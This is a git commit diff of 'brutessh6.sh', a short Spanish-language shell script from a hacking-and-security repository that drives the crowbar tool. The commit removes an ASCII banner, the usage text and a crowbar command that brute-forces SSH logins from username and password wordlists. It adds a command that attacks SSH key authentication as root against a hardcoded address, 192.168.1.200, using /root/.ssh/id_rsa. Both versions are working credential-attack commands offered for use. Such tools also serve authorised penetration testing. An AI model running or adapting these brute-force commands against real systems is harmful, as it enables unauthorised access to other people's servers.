1973f78ec4cd851d8232092b74a702b1054c54c3
hackingyseguridad <antonio_taboada@hotmail.es>
2025-02-05 20:56:12 +0100

    Update brutessh6.sh

--- brutessh6.sh
+++ brutessh6.sh
@@ -1,43 +1,7 @@
 #!/bin/bash
 cat << "INFO"
-                                                          ..
-                               ,,,                         MM .M
-                           ,!MMMMMMM!,                     MM MM  ,.
-   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
- . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
-;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
- M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
- 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
-  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
- MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
- 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
-  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
-   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
-  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
-  MMM      :M  'MMMMMMMMMMM Brute SSH MMMMMMMM'.MM  MM:M.    'MMMMM
- .MMM   ...:M: :M.'MM hackingyseguridad.com M'.M''   MM:MMMMMMMMMMMM'
-AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
-MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
- '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
-            MMM.            'MMMM!MMMM'            .MM
-             MMM.             '''   ''            .MM'
-              MMM.                               MMM'
-               MMMM            ,.J.JJJJ.       .MMM'
-                MMMM.       'JJJJJJJ'JJJM   CMMMMM
-                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
-                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
-                      'MMMMMMMMM'JJJJJ JJJJJ'
-                         ''MMMMMMJJJJJJJJJJ'
-                                 'JJJJJJJJ'
+Ataque ssh con id clave rsa
 INFO
-if [ -z "$1" ]; then
-        echo
-        echo "Fuerza bruta con diccionarios a RDP."
-        echo "Requiere crowbar"
-        echo "Uso.: sh brutessh6.sh <ip>"
-        echo
-        exit 0
-fi
 echo
 echo
-crowbar -b ssh -s $1/32 $2 -U usuarios0.txt -C claves0.txt -n 1
+crowbar -b sshkey -s 192.168.1.200/32 -u root -k /root/.ssh/id_rsa
